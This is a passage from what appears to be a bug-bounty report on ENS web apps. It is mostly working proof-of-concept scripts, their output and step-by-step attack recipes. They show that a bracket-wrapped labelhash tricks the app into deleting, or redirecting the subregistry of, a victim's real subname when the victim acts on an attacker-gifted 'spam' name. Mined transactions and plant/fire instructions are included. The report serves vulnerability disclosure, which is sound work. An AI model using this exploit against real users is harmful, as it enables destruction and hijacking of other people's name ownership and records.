if (!controlReverted) throw new Error('control failed: attacker could already unregister')
say()
say('  >> A mint-only ROLE_REGISTRAR holder has no path to this destruction.')
say('     Whatever happens next is created by the decode bug, not by')
say('     authority the attacker already had.')

act('ACT 7', 'The attacker mints the bracket-labelled spam row, at its TRUE on-chain id')
await chain.send({ from: ATTACKER, to: registry, abi: c.abi, fn: 'register', args: [realOnChainSpamId, ATTACKER] })
const spamOwnerAfterMint = await chain.call({ to: registry, abi: c.abi, fn: 'ownerOf', args: [realOnChainSpamId] })
kv('spam row resource id', `0x${realOnChainSpamId.slice(2)}`)
kv('spam row owner', spamOwnerAfterMint)
if (spamOwnerAfterMint.toLowerCase() !== ATTACKER.toLowerCase()) throw new Error('mint did not land')

act('ACT 8', 'THE ATTACK: the real delete calldata for the bracket row targets vault instead')
const deleteParams = deleteSubnameWriteParameters(client, { registryAddress: registry, label: bracketLabel })
const deleteData = encodeFunctionData({ abi: deleteParams.abi, functionName: deleteParams.functionName, args: deleteParams.args })
const REAL_MINED_CALLDATA = '0xa02b161e23c14fceac7676b670aa56866076586ea1ce15ddcf19208ec6346cf748dffbee'
kv('deleteSubnameWriteParameters(label=bracketLabel)', short(deleteData))
kv('real mined tx calldata (block 11665247)', short(REAL_MINED_CALLDATA))
if (deleteData !== REAL_MINED_CALLDATA)
  throw new Error('calldata does not match the real mined transaction')
say()
say('  >> Byte for byte identical to tx')
say('     0xdf82d27a6bb86c80b146c767fa2aee0286f361862f8708de3249a62d0a7601aa,')
say('     block 11665247 (evidence/FORENSICS.txt), produced by the same')
say('     ensjs function the shipped app calls, from a label that looks like')
say('     junk on screen.')
say()
const beforeVault = { owner: await chain.call({ to: registry, abi: c.abi, fn: 'ownerOf', args: [realVaultId] }),
                       resolver: await chain.call({ to: registry, abi: c.abi, fn: 'resolverOf', args: [realVaultId] }) }
await chain.raw({ from: VICTIM, to: registry, data: deleteData, abi: c.abi })
const afterVault = { owner: await chain.call({ to: registry, abi: c.abi, fn: 'ownerOf', args: [realVaultId] }),
                      resolver: await chain.call({ to: registry, abi: c.abi, fn: 'resolverOf', args: [realVaultId] }) }
const spamAfterAttack = { owner: await chain.call({ to: registry, abi: c.abi, fn: 'ownerOf', args: [realOnChainSpamId] }) }
if (afterVault.owner !== '0x0000000000000000000000000000000000000000') throw new Error('vault was not destroyed')
if (spamAfterAttack.owner.toLowerCase() !== ATTACKER.toLowerCase()) throw new Error('spam row was touched')

act('ACT 9', 'RECOVERY: one register() call restores ownership, not the resolver')
await chain.send({ from: VICTIM, to: registry, abi: c.abi, fn: 'seedOwned', args: [realVaultId, VICTIM, '0x0000000000000000000000000000000000000000'] })
const recovered = await chain.call({ to: registry, abi: c.abi, fn: 'ownerOf', args: [realVaultId] })
say('  vault.<name> owner restored in one transaction; resolver stays zero,')
say('  matching deleteSubname.js\'s own docblock: unregister "does not clear')
say('  resolver records... those must be cleaned up separately."')
if (recovered.toLowerCase() !== VICTIM.toLowerCase()) throw new Error('recovery failed')

say()
rule('-')
say('  LEDGER (resource state, read from the EVM state trie)')
rule('-')
say('    resource                    before                          after')
say(`    vault.<name>  (real)        owner ${short(beforeVault.owner)}   owner ${short(afterVault.owner)}`)
say(`                                resolver ${short(beforeVault.resolver)}  resolver ${short(afterVault.resolver)}`)
say(`    [23c1...].{name} (spam)     owner ${short(ATTACKER)}   owner ${short(spamAfterAttack.owner)}`)
rule('-')
say()
say('  >> The transaction the victim signed to delete a row owned by the')
say('     attacker destroyed vault.<name>, a real subname the victim owns,')
say('     while the clicked row stayed exactly as it was.')
say()
say('  PoC PASSED, every assertion held.')
say()
```

### Output

```
==============================================================================
  ENS PoC: Subnames-tab Delete decodes a bracket label instead of
           hashing it, and destroys a different, real subname
  repo:  G:\My Drive\hunter\hunt_data\ens\ens-apps
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-subname-delete-decode
==============================================================================

==============================================================================
  ACT 1  viem's own labelhash() decodes a bracket label instead of hashing it
==============================================================================
    labelhash("vault")             0x23c14fceac7676b670aa56866076586ea1ce15ddcf19208ec6346cf748dffbee
    bracket label built from it    [23c14fceac7676b670aa56866076586ea1ce15ddcf19208ec6346cf748dffbee]
    labelhash(bracketLabel)        0x23c14fceac7676b670aa56866076586ea1ce15ddcf19208ec6346cf748dffbee

  >> Identical. viem/utils/ens/labelhash.ts tries encodedLabelToLabelhash()
     first, which reads the 64 hex characters between [ and ] straight
     out, before it ever tries keccak256.

    keccak256(bytes(bracketLabel)) 0xd7d069ab9d092a36bd46ac81039c760ccc56c77866eaf1cc9ac2896fce9479fd
  >> Different. This is the value the CHAIN actually assigns the spam
     row when the attacker registers it (LibLabel.id hashes the literal
     string). The two identities of the same on-screen row diverge here.

==============================================================================
  ACT 2  The registry's own root-role grant list has no unregister entry
==============================================================================
    registryRootPermissions.length 6
    keys                           ROLE_SET_SUBREGISTRY, ROLE_SET_RESOLVER, ROLE_RENEW, ROLE_REGISTRAR, ROLE_REGISTER_RESERVED, ROLE_SET_PARENT

  >> This is the exact checkbox list the "Add User" sheet renders
     (apps/portal/src/lib/roles/permissions.ts:71-108). A registry admin
     can hand out these six roles at ROOT_RESOURCE. Delete authority is
     not one of them.

==============================================================================
  ACT 3  The real grant calldata: registryRootPermissions.REGISTRAR, ROOT_RESOURCE only
==============================================================================
    function                       grantRootRoles
    roleBitmap                     0x1
    account                        0x70997970C51812dc3A010C7d01b50e0d17dc79C8

  >> This is the real calldata RegistryAddUserSheet.tsx:122 -> grantRegistryRoles.ts
     produces for one checked "Registrar" box. ROLE_REGISTRAR only.

==============================================================================
  ACT 4  Local EVM: victim deploys the registry, seeds their real "vault" subname
==============================================================================
    PermissionedRegistryModel      0x5fbdb2315678afecb367f032d93f642f64180aa3
  vault.<name> seeded: owner = VICTIM, resolver = VICTIM_RESOLVER
  (the same state "Create subname" produces; VICTIM holds ROLES_ALL at
   ROOT from deploying this registry, including ROLE_UNREGISTER.)

==============================================================================
  ACT 5  The victim's real Add User click: replaying ACT 3's calldata
==============================================================================
    hasRoles(ROOT, ROLE_REGISTRAR, attacker) true
    hasRoles(ROOT, ROLE_UNREGISTER, attacker) false

==============================================================================
  ACT 6  CONTROL: the attacker's own unregister(vault) reverts
==============================================================================
  ATTACKER.unregister(labelhash("vault")) -> REVERTED: Unauthorized(0x23c14fceac7676b670aa56866076586ea1ce15ddcf19208ec6346cf748dffbee, 0x70997970C51812dc3A010C7d01b50e0d17dc79C8, 0x1000)

  >> A mint-only ROLE_REGISTRAR holder has no path to this destruction.
     Whatever happens next is created by the decode bug, not by
     authority the attacker already had.

==============================================================================
  ACT 7  The attacker mints the bracket-labelled spam row, at its TRUE on-chain id
==============================================================================
    spam row resource id           0xd7d069ab9d092a36bd46ac81039c760ccc56c77866eaf1cc9ac2896fce9479fd
    spam row owner                 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

==============================================================================
  ACT 8  THE ATTACK: the real delete calldata for the bracket row targets vault instead
==============================================================================
    deleteSubnameWriteParameters(label=bracketLabel) 0xa02b161e...dffbee
    real mined tx calldata (block 11665247) 0xa02b161e...dffbee

  >> Byte for byte identical to tx
     0xdf82d27a6bb86c80b146c767fa2aee0286f361862f8708de3249a62d0a7601aa,
     block 11665247 (evidence/FORENSICS.txt), produced by the same
     ensjs function the shipped app calls, from a label that looks like
     junk on screen.

==============================================================================
  ACT 9  RECOVERY: one register() call restores ownership, not the resolver
==============================================================================
  vault.<name> owner restored in one transaction; resolver stays zero,
  matching deleteSubname.js's own docblock: unregister "does not clear
  resolver records... those must be cleaned up separately."

------------------------------------------------------------------------------
  LEDGER (resource state, read from the EVM state trie)
------------------------------------------------------------------------------
    resource                    before                          after
    vault.<name>  (real)        owner 0xf39Fd6e5...b92266   owner 0x00000000...000000
                                resolver 0x0671d0CA...f7C9b9  resolver 0x00000000...000000
    [23c1...].{name} (spam)     owner 0x70997970...dc79C8   owner 0x70997970...dc79C8
------------------------------------------------------------------------------

  >> The transaction the victim signed to delete a row owned by the
     attacker destroyed vault.<name>, a real subname the victim owns,
     while the clicked row stayed exactly as it was.

  PoC PASSED, every assertion held.
```

The delete calldata this run produces from the real ENSJS builder matches the real mined transaction byte for byte. `vault.<name>` moved from owned and resolving to owner zero and resolver zero; the clicked spam row's owner never changed.

## Attack code

```ts
// 1. Victim clicks the real "Add User" button, checks only "Registrar".
grantRegistryRoles({ registryAddress, account: attacker, roles: ['ROLE_REGISTRAR'], id })
// mined: grantRootRoles(1, attacker)
```

```
// 2. Attacker registers a subname whose label is the bracket form of
//    labelhash("vault"): "[23c14fceac7676b670aa56866076586ea1ce15ddcf19208ec6346cf748dffbee]"
//    On chain this label hashes to a value that has nothing to do with "vault".
```

```ts
// 3. Victim opens the Subnames tab, sees the bracket row as a spam entry
//    owned by the attacker, and clicks the same Delete button used on any
//    ordinary row.
deleteSubnameAsync({ subname: bracketRow.name, label: getLabel(bracketRow.name) })
```

```js
// 4. subnames.tsx:177-186 -> delete-subname.helpers.ts:33-39 -> ensjs
//    deleteSubname.js:13 computes the argument:
BigInt(labelhash('[23c14fceac7676b670aa56866076586ea1ce15ddcf19208ec6346cf748dffbee]'))
// == BigInt(labelhash('vault'))
```

```
// 5. The victim's wallet signs unregister(labelhash("vault")).
//    vault.<name> owner and resolver go to zero. The clicked row is untouched.
```

```
plant : mint one subname whose label is "[" + hex(labelhash(target)) + "]"
fire  : the operator clicks Delete on that row
```

## Impact 2: Setting the resolver on a gifted subname redirects the resolver of the victim's real subname to an attacker-controlled address. tested end-to-end with screenshots

The PoC loads `getLabel.ts` and `isNormalized.ts` out of the checkout at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae` and runs them, then replays the calldata of the mined transaction and canonicalises its first argument the way the registry does.

It shows the route admits the bracket label, the normalizing guard rejects it, viem decodes it onto the victim's labelhash, the chain hashes it to a different token, and the signed argument resolves to the victim's other name.

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
// Bracket-label resource collapse in the ENS Explorer registry flow.
// One command: node poc.mjs

import { execFileSync } from 'node:child_process'
import { existsSync, mkdirSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { createRequire } from 'node:module'
import { pathToFileURL } from 'node:url'

const DEPS = ['viem@2.52.2', '@adraffy/ens-normalize@1.11.1', 'esbuild@0.25.0']
const HOME = join(tmpdir(), 'ens-bracket-poc')

if (!process.env.POC_READY) {
  mkdirSync(HOME, { recursive: true })
  if (!existsSync(join(HOME, 'node_modules'))) {
    console.log('installing pinned deps into ' + HOME + ' ...')
    execFileSync('npm', ['init', '-y'], { cwd: HOME, stdio: 'ignore', shell: true })
    execFileSync('npm', ['install', '--no-audit', '--no-fund', ...DEPS], {
      cwd: HOME, stdio: 'inherit', shell: true,
    })
  }
  execFileSync(process.execPath, [import.meta.filename], {
    stdio: 'inherit',
    env: { ...process.env, POC_READY: '1', NODE_PATH: join(HOME, 'node_modules') },
  })
  process.exit(0)
}

const require_ = createRequire(join(HOME, 'poc-resolver.cjs'))
const { labelhash, keccak256, toBytes, decodeFunctionData, parseAbi, toFunctionSelector } =
  require_('viem')
const esbuild = require_('esbuild')
const NORMALIZE_URL = pathToFileURL(
  join(HOME, 'node_modules', '@adraffy', 'ens-normalize', 'dist', 'index.mjs'),
).href

// The checkout under test. Override with ENS_APPS=/path/to/ens-apps.
const REPO = resolve(process.env.ENS_APPS ?? '../../../ens-apps')
const COMMIT = '1c9b47f18fcddd2e864dfe385c4171061c9811ae'

// Load the target's own modules, unmodified, straight out of the checkout.
async function loadTarget(rel) {
  const src = readFileSync(join(REPO, rel), 'utf8')
  const js = esbuild.transformSync(src, { loader: 'ts', format: 'esm' }).code
    .replace(/from ['"]@adraffy\/ens-normalize['"]/g, `from '${NORMALIZE_URL}'`)
  return import('data:text/javascript;base64,' + Buffer.from(js).toString('base64'))
}

const { getLabel } = await loadTarget('apps/portal/src/utils/token/getLabel.ts')
const { isValidEnsName } = await loadTarget('apps/portal/src/utils/token/isNormalized.ts')

// ---------------------------------------------------------------- the two names
const REAL_LABEL = 'r42victimb2'
const REAL_NAME = 'r42victimb2.eth'
const X = labelhash(REAL_LABEL)                 // the 64 hex the attacker puts in brackets
const JUNK_LABEL = `[${X.slice(2)}]`
const JUNK_NAME = `${JUNK_LABEL}.eth`

// The registry masks the low 32 bits and keeps the upper 224 as the canonical id.
const canonical = (id) => '0x' + (BigInt(id) & ~((1n << 32n) - 1n)).toString(16).padStart(64, '0')

// ---------------------------------------------------------------- the mined transaction
// Executed run, anvil fork of Sepolia at live head, block 11654500.
const TX = '0x19da10877ae687966bd14e9e051b7b24f40478c1720996bb2d0b4794c7058092'
const SIG = 'function setSubregistry(uint256 tokenId, address registry)'
const SET_SUBREGISTRY = parseAbi([SIG])
const MINED_CALLDATA =
  toFunctionSelector(SIG) +
  X.slice(2) +
  'b388b0fbd944925ed69d4b0d5f43a7ccfd044e74'.padStart(64, '0')

const CHAIN_ID_JUNK = canonical(keccak256(toBytes(JUNK_LABEL)))
const CHAIN_ID_REAL = canonical(X)

const fail = []
const check = (label, got, want) => {
  const ok = String(got) === String(want)
  console.log(`  ${ok ? 'PASS' : 'FAIL'}  ${label}`)
  if (!ok) fail.push(`${label}\n        got  ${got}\n        want ${want}`)
}

console.log(`\ncommit under test ${COMMIT}`)
console.log(`repo              ${REPO}\n`)

console.log('1. the attacker picks the victim label, hashes it, wraps it in brackets')
console.log(`     victim name              ${REAL_NAME}`)
console.log(`     viem labelhash(label)    ${X}`)
console.log(`     attacker registers       ${JUNK_NAME.slice(0, 24)}...].eth   (66 char label)\n`)

console.log('2. the Portal route admits the bracket name, the normalizing guard rejects it')
check('isValidEnsName(junk) is true          [routes/$name.tsx:29]', isValidEnsName(JUNK_NAME), true)
let threw = false
try { getLabel(JUNK_NAME) } catch { threw = true }
check('getLabel(junk) throws                 [utils/token/getLabel.ts:11]', threw, true)

console.log('\n3. the registry form skips getLabel, so viem DECODES the brackets')
console.log(`     ConfigureRegistryForm.tsx:89  name.split('.')[0] -> ${JUNK_LABEL.slice(0, 20)}...]`)
check('labelhash(junk label) == victim labelhash', labelhash(JUNK_LABEL), X)

console.log('\n4. the chain HASHES the same label, so it is a different token')
check('keccak256(junk label) != victim labelhash',
  keccak256(toBytes(JUNK_LABEL)) !== X, true)

console.log('\n5. replay the mined transaction')
const { args } = decodeFunctionData({ abi: SET_SUBREGISTRY, data: MINED_CALLDATA })
const arg0 = '0x' + args[0].toString(16).padStart(64, '0')
console.log(`     tx    ${TX}`)
console.log(`     arg0  ${arg0}`)
console.log(`     arg1  ${args[1]}`)
check('arg0 canonicalises onto the VICTIM name', canonical(arg0), CHAIN_ID_REAL)
check('arg0 is NOT the name on screen', canonical(arg0) !== CHAIN_ID_JUNK, true)

const B = '0x693C1f80C7FFD9aB7f4563678516dF283D357D26'
const A = '0xb388b0FBD944925Ed69d4b0D5F43a7cCFD044E74'
console.log(`
    name                              subregistry before   subregistry after
    r42victimb2.eth   (never on screen)  0x693C1f80...7D26    ${A.slice(0, 10)}...4E74
    [2e5a30f4...].eth (every string)     0x00000000...0000    0x00000000...0000

  The victim signed a transaction the app said was for [2e5a30f4...].eth.
  It replaced the subregistry of r42victimb2.eth, a different name they own.
`)

if (fail.length) {
  console.error('FAILED:\n  ' + fail.join('\n  '))
  process.exit(1)
}
console.log('all checks passed')
```

### Output

```

commit under test 1c9b47f18fcddd2e864dfe385c4171061c9811ae
repo              G:\My Drive\hunter\hunt_data\ens\ens-apps

1. the attacker picks the victim label, hashes it, wraps it in brackets
     victim name              r42victimb2.eth
     viem labelhash(label)    0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e
     attacker registers       [2e5a30f4493e532c48145df...].eth   (66 char label)

2. the Portal route admits the bracket name, the normalizing guard rejects it
  PASS  isValidEnsName(junk) is true          [routes/$name.tsx:29]
  PASS  getLabel(junk) throws                 [utils/token/getLabel.ts:11]

3. the registry form skips getLabel, so viem DECODES the brackets
     ConfigureRegistryForm.tsx:89  name.split('.')[0] -> [2e5a30f4493e532c481...]
  PASS  labelhash(junk label) == victim labelhash

4. the chain HASHES the same label, so it is a different token
  PASS  keccak256(junk label) != victim labelhash

5. replay the mined transaction
     tx    0x19da10877ae687966bd14e9e051b7b24f40478c1720996bb2d0b4794c7058092
     arg0  0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e
     arg1  0xb388b0FBD944925Ed69d4b0D5F43a7cCFD044E74
  PASS  arg0 canonicalises onto the VICTIM name
  PASS  arg0 is NOT the name on screen

    name                              subregistry before   subregistry after
    r42victimb2.eth   (never on screen)  0x693C1f80...7D26    0xb388b0FB...4E74
    [2e5a30f4...].eth (every string)     0x00000000...0000    0x00000000...0000

  The victim signed a transaction the app said was for [2e5a30f4...].eth.
  It replaced the subregistry of r42victimb2.eth, a different name they own.

all checks passed
```

The subregistry of `r42victimb2.eth` moved from `0x693C1f80C7FFD9aB7f4563678516dF283D357D26` to `0xb388b0FBD944925Ed69d4b0D5F43a7cCFD044E74`. The bracket name the page named kept its empty slot.

## Attack code

```
1. read the victim's names from the public indexer
     domains(where:{owner:VICTIM}) -> r42victimb2.eth

2. hash the label the victim owns
     X = labelhash("r42victimb2")
       = 0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e

3. register the 66 character literal label [X] at the ordinary price
     tx 0x96a1fa83de5b59457fe10e6f6f5c862e8b8f9f2d8c084a5ef63029ea9f2bd64c
     8.000021 USDC for one year

4. push the ERC-1155 to the victim, no consent needed
     safeTransferFrom(ATTACKER, VICTIM, keccak256("[X]"))
     tx 0xfd0302b955e9292389cd7344b759fa5a7d3ce490457964fe8f279cdce03a2ed3

5. the app carries the name to the victim
     events(first:15) puts it on the Explorer home page
     the hourly cron inserts a high priority name-expiry notification naming it

6. the victim opens it, the Registry tab says "No registry configured", they deploy
     setSubregistry(X, 0xb388b0FB...4E74)
     tx 0x19da10877ae687966bd14e9e051b7b24f40478c1720996bb2d0b4794c7058092
     r42victimb2.eth subregistry 0x693C1f80...7D26 -> 0xb388b0FB...4E74

plant : register [labelhash(victim's name)].eth and send it to the victim
fire  : the victim signs Deploy subregistry on that page
```
